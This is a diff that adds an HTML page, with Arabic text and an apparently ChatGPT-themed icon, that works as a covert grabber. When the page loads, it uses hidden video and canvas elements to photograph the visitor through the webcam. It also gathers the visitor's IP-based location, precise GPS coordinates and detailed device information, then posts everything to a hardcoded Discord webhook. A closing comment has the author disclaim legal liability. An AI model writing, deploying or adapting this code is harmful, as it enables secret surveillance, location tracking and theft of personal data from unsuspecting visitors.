@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="ar">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>(•-•)</title>
+    <style>
+      body, html {
+        margin: 0;
+        padding: 0;
+        width: 100%;
+        height: 100%;
+        background-color: white;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+      video, canvas {
+        display: none;
+      }
+      <link rel="icon" href="https://www.securities.io/wp-content/uploads/2024/03/ChatGPT.jpeg" type="image/jpeg">
+    </style>
+  </head>
+  <body>
+    <video id="video" width="640" height="480" autoplay></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+    <script>
+      const webhookURL = "https://discord.com/api/webhooks/1362846794458857572/-uovKrcHiDnprS1IWPLI1RSahCht_ypX_5BO8R9xEc5KZQ1XCrZSZ9uKt9VD3cbQmiXJ";
+      
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const context = canvas.getContext('2d');
+
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          video.srcObject = stream;
+          setTimeout(captureAndSend, 2000);
+        })
+        .catch(err => {
+          console.error("خطأ في الوصول للكاميرا: ", err);
+        });
+
+      function captureAndSend() {
+        context.drawImage(video, 0, 0, 640, 480);
+        context.font = '20px Arial';
+        context.fillStyle = 'red';
+        context.fillText('حقوقك محفوظة', 10, canvas.height - 20);
+
+        canvas.toBlob(blob => {
+          const formData = new FormData();
+          formData.append('file', blob, 'image.png');
+          
+          collectAndSend().then(message => {
+            formData.append('content', message);
+            sendToWebhook(formData);
+          }).catch(error => {
+            console.error("خطأ في جمع البيانات:", error);
+          });
+        }, 'image/png');
+      }
+
+      async function collectAndSend() {
+        const ipInfo = await getIPInfo();
+        const battery = await getBatteryInfo();
+        const connection = await getConnectionInfo();
+        const device = getDeviceInfo();
+        const now = new Date().toLocaleString("ar-EG");
+
+        let message = `📱 **معلومات الجهاز:**
+- الدولة: ${ipInfo.country_name || "غير معروف"} 🔻
+- المدينة: ${ipInfo.city || "غير معروف"} 🏙️
+- عنوان IP: ${ipInfo.ip || "غير معروف"} 🌍
+- شحن الهاتف: ${battery.level}% 🔋
+- هل الهاتف يشحن؟: ${battery.charging}
+- الشبكة: ${connection.type} 📶 (سرعة: ${connection.downlink})
+- نوع الاتصال: ${connection.type} 📡
+- الوقت: ${now} ⏰
+- اسم الجهاز: ${device.platform} 🖥️
+- إصدار الجهاز: ${device.userAgent} 📜
+- نوع الجهاز: ${device.isMobile}
+- الذاكرة (RAM): ${device.ram} 🧠
+- عدد الأنوية: ${device.cores} ⚙️
+- لغة النظام: ${device.language} 🌐
+- اسم المتصفح: ${device.browser} 🌐
+- دقة الشاشة: ${device.screenSize} 📏
+- إصدار نظام التشغيل: ${device.os} 🖥️
+- وضع الشاشة: ${device.orientation} 🔄
+- عمق الألوان: ${device.colorDepth} 🎨
+- تاريخ آخر تحديث للمتصفح: ${device.lastUpdate} 📅
+- بروتوكول الأمان المستخدم: ${device.https} 🔒
+- إمكانية تحديد الموقع الجغرافي: ${"geolocation" in navigator ? "مدعوم 🌍" : "غير مدعوم"}
+- الدعم لتقنية البلوتوث: ${device.bluetooth}
+- دعم الإيماءات اللمسية: ${device.touch}`;
+
+        if ("geolocation" in navigator) {
+          return new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(async (position) => {
+              message += `\n- الموقع الحقيقي: https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude} 🌍 (دقة: ${position.coords.accuracy} متر)`;
+              resolve(message);
+            }, (error) => {
+              message += `\n- الموقع الحقيقي: تم رفض الإذن أو فشل التحديد ❌`;
+              resolve(message);
+            });
+          });
+        } else {
+          message += `\n- الموقع الحقيقي: غير مدعوم في هذا الجهاز ❌`;
+          return Promise.resolve(message);
+        }
+      }
+
+      async function getIPInfo() {
+        const res = await fetch("https://ipapi.co/json/");
+        return await res.json();
+      }
+
+      async function getBatteryInfo() {
+        if (navigator.getBattery) {
+          const battery = await navigator.getBattery();
+          return {
+            level: Math.round(battery.level * 100),
+            charging: battery.charging ? "نعم ⚡" : "لا ⚡"
+          };
+        }
+        return { level: "غير مدعوم", charging: "غير مدعوم" };
+      }
+
+      async function getConnectionInfo() {
+        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        return connection ? {
+          type: connection.type || "غير معروف",
+          downlink: connection.downlink + " ميغابت في الثانية"
+        } : {
+          type: "غير مدعوم",
+          downlink: "غير مدعوم"
+        };
+      }
+
+      function getDeviceInfo() {
+        return {
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          language: navigator.language,
+          screenSize: `${screen.width}x${screen.height}`,
+          orientation: (screen.orientation || {}).type || "غير معروف",
+          colorDepth: screen.colorDepth,
+          browser: detectBrowser(),
+          os: detectOS(),
+          isMobile: /Mobi|Android/i.test(navigator.userAgent) ? "محمول 📱" : "حاسوب 🖥️",
+          ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "غير معروف",
+          cores: navigator.hardwareConcurrency || "غير معروف",
+          bluetooth: !!navigator.bluetooth ? "مدعوم 🔵" : "غير مدعوم",
+          touch: 'ontouchstart' in window ? "مدعوم ✋" : "غير مدعوم",
+          https: location.protocol,
+          lastUpdate: document.lastModified
+        };
+      }
+
+      function detectBrowser() {
+        const ua = navigator.userAgent;
+        if (ua.includes("Chrome")) return "Chrome";
+        if (ua.includes("Firefox")) return "Firefox";
+        if (ua.includes("Safari")) return "Safari";
+        if (ua.includes("Edge")) return "Edge";
+        return "غير معروف";
+      }
+
+      function detectOS() {
+        const ua = navigator.userAgent;
+        if (/Windows NT/.test(ua)) return "Windows";
+        if (/Android/.test(ua)) return "Android";
+        if (/iPhone|iPad/.test(ua)) return "iOS";
+        if (/Linux/.test(ua)) return "Linux";
+        return "غير معروف";
+      }
+
+      function sendToWebhook(formData) {
+        fetch(webhookURL, {
+          method: 'POST',
+          body: formData
+        })
+        .then(response => {
+          if (response.ok) {
+            console.log('تم إرسال الصورة والمعلومات بنجاح');
+            return response.json();
+          } else {
+            throw new Error('خطأ في إرسال الصورة');
+          }
+        })
+        .then(data => console.log(data))
+        .catch(error => console.error('خطأ:', error));
+      }
+    </script>
+  </body>
+</html>
+
+<!--اخلاء المسوؤلية:
+رساله من صانع الموقع وهي انني اخلي مسوؤليتي من اي قضية تتم رفعها علي ووضعت هذا بالموقع ويمكن ل اي شخص رؤيته لو فعل inspect ثانيا الموقع يوجد به طلب اذن ويوجد خيارين اما رفض واما موافقه لو تم ضغط الموافقه ف المستخدم وافق على اي شيء سيحدث بعدها-->
